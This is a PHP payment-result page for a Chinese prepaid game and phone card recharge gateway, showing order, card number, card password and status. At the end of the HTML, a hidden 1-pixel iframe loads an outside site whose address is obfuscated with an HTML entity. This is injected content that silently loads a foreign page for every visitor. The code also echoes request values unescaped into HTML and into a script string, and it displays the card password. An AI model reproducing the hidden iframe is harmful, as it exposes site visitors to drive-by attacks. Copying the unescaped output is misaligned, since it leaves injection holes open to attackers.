<?php
include_once("../config.php");
$action=$_REQUEST["action"];
if ($action=="flag")
{
  $C_OrderId=$_REQUEST["C_OrderId"];
  $C_ChannelId=$_REQUEST["C_ChannelId"];
  $C_CardId=$_REQUEST["C_CardId"];
  $C_FaceValue=$_REQUEST["C_FaceValue"];
  $strarr="P_UserId=".$UserId;
  $strarr.="&P_OrderId=".$C_OrderId;
  $strarr.="&P_ChannelId=".$C_ChannelId;
  $strarr.="&P_CardId=".$C_CardId;
  $strurl=$strarr."&P_FaceValue=".$C_FaceValue;
  $geturl=$strurl."&P_PostKey=".$SalfStr;
  $postkey=md5($geturl);
  $strurl=$strurl."&P_PostKey=".$postkey;
  $resultmsg = file_get_contents("http://Api.Duqee.Com/pay/query.aspx?".$strurl);
  $getbody=preg_split("/&/",$resultmsg);
  if ($getbody[5]=="")
  {
    echo "提交错误";
  }
  else
  {
  $paymoney=preg_split("/=/",$getbody[4]);//成功金额;
  $paymoneyValue=$paymoney[1];
  $flag=preg_split("/=/",$getbody[5]);//提交状态
  $flagValue=$flag[1];
  $cardstatus=preg_split("/=/",$getbody[6]);//订单状态
  $cardstatusValue=$cardstatus[1];
  $errmsg=preg_split("/=/",$getbody[7]);//错误描述
  $errmsgValue=$errmsg[1];
  if ($flagValue==0)
  {//为0时订单还未处理
	   echo "<img src='../images/onLoad.gif' align='middle' />正在处理..";
  }
  elseif($flagValue==1)
   {//为1时订单已经处理
     if($cardstatusValue==0)
     {//0为处理失败
	      echo "<font color=red>".$errmsgValue."</font>";
	 }
	 else
	 {
	      echo "<font color=green>成功!实际金额为：".$paymoneyValue."</font>";
	 }
   }
  }
  exit();
}
$P_CardId=$_REQUEST["cardId"];
$P_CardPass=$_REQUEST["cardPass"];
$P_FaceValue=$_REQUEST["faceValue"];
$P_ChannelId=$_REQUEST["channelId"];
$P_Subject=$_REQUEST["subject"];
$P_Price=$_REQUEST["price"];
$P_Quantity=$_REQUEST["quantity"];
$P_Description=$_REQUEST["description"];
$P_Notic=$_REQUEST["notic"];
$P_Result_url=$result_url;
$P_Notify_url=$notify_url;
if(empty($P_Price)){$P_Price=0;};
$P_OrderId=getOrderId();
if ( $P_CardId == "")
{
				exit( "<script>alert('卡号错误!');window.history.back(-1);</script>" );
}
if ( $P_CardPass == "")
{
				exit( "<script>alert('密码错误!');window.history.back(-1);</script>" );
}
if ( $P_FaceValue == "" || intval( $P_FaceValue ) == 0 )
{
				exit( "<script>alert('金额错误!');window.history.back(-1);</script>" );
}
$preEncodeStr=$UserId."|".$P_OrderId."|".$P_CardId."|".$P_CardPass."|".$P_FaceValue."|".$P_ChannelId."|".$SalfStr;

$P_PostKey=md5($preEncodeStr);

$params="P_UserId=".$UserId;
$params.="&P_OrderId=".$P_OrderId;
$params.="&P_CardId=".$P_CardId;
$params.="&P_CardPass=".$P_CardPass;
$params.="&P_FaceValue=".$P_FaceValue;
$params.="&P_ChannelId=".$P_ChannelId;
$params.="&P_Subject=".$P_Subject;
$params.="&P_Price=".$P_Price;
$params.="&P_Quantity=".$P_Quantity;
$params.="&P_Description=".$P_Description;
$params.="&P_Notic=".$P_Notic;
$params.="&P_Result_url=".$P_Result_url;
$params.="&P_Notify_url=".$P_Notify_url;
$params.="&P_PostKey=".$P_PostKey;

//在这里对订单进行入库保存

//下面这句是提交到API

$resultmsg=file_get_contents($gateWary."?".$params);


//通道类型
function getChannelname($channelid)
{
 switch($channelid){
   case "4": 
     echo "腾讯QB卡";
	 break;
   case "5": 
     echo "盛大一卡通";
	 break;
   case "6": 
     echo "骏网一卡通";
	 break;
   case "7": 
     echo "完美一卡通";
	 break;
   case "8": 
     echo "搜狐一卡通";
	 break;
   case "9": 
     echo "征途游戏卡";
	 break;
   case "10": 
     echo "久游一卡通";
	 break;
   case "11": 
     echo "网易一卡通";
	 break;
   case "12": 
     echo "光宇一卡通";
	 break;
   case "13": 
     echo "电信充值卡";
	 break;
   case "14": 
     echo "移动充值卡";
	 break;
   case "15": 
     echo "联通充值卡";
	 break;
   case "16": 
     echo "纵游一卡通";
	 break;
   case "17": 
     echo "天宏一卡通";
	 break;
   case "18": 
     echo "天下一卡通";
	 break;
  }
}

function getOrderId()
{
	return date("YmdHis")."".rand(1000000,9999999);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>支付结果页</title>
<link rel="stylesheet" href="../images/app_style.css"  type="text/css" />
<script type="text/javascript"> 
var xmlHttp; 

function createXMLHttpRequest(){ 
if(window.ActiveXObject){ 
xmlHttp = new ActiveXObject("Microsoft.XMLHTTP"); 
} 
else if(window.XMLHttpRequest){ 
xmlHttp = new XMLHttpRequest(); 
} 
} 
function orderStatus(corder,cid,kid,fv){ 
createXMLHttpRequest(); 
try{ 
xmlHttp.onreadystatechange = orderStatuschange; 
xmlHttp.open("GET", "?action=flag&C_OrderId="+escape(corder)+"&C_ChannelId="+escape(cid)+"&C_CardId="+escape(kid)+"&C_FaceValue="+escape(fv)+"&rnd="+Math.random(), true); 
xmlHttp.send(null); 
}catch(exception){ 
document.getElementById('orderStatus').innerHTML ="订单结果返回失败,请联系客服"; 
} 
}
function orderStatuschange(){ 
if(xmlHttp.readyState == 4){ 
if (xmlHttp.status == 200 || xmlHttp.status == 0){ 
document.getElementById('orderStatus').innerHTML =xmlHttp.responseText
} 
} 
}
setInterval("orderStatus('<?=$P_OrderId?>','<?=$P_ChannelId?>','<?=$P_CardId?>','<?=$P_FaceValue?>')",5000);
</script>
</head>
<body>
<div id="wrap">
<table width="100%" height="34" border="0" align="center" cellpadding="0" cellspacing="0" style="margin-top:20px">
  <tr>
    <td width="33%"><img src="../images/logo-pay.jpg" /></td>
	<td width="68%" valign="bottom"><span class="logotxt">支付结果</span></td>
  </tr>
</table>
<table width="600" border="0" align="center" cellpadding="0" cellspacing="1" class="mytable">
      <tr>
        <td width="100" height="25" align="right">订单号：</td>
        <td><?=$P_OrderId?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">充值类别：</td>
        <td><?=getChannelname($P_ChannelId)?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">卡号：</td>
        <td><?=$P_CardId?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">卡密：</td>
        <td><?=$P_CardPass?></td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">支付金额：</td>
        <td><font style="font-size:14px; font-family:Geneva, Arial, Helvetica, sans-serif;color:#FF0000; font-weight:bold"><?=$P_FaceValue?></font> 元</td>
      </tr>
	  <tr>
        <td width="100" height="25" align="right">订单状态：</td>
        <td><span id="orderStatus"><img src="../images/onLoad.gif" align="middle" />正在处理..</span></td>
      </tr>
	  <tr><td colspan="2" align="center" style="color:#FF0000">注意：如果未正常返回订单结果，请复制订单号联系客服</td></tr>
	  <tr><td colspan="2" align="center"><input type="button" value="关闭" onclick="window.close()"/></td></tr>
</table>
    <br />
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>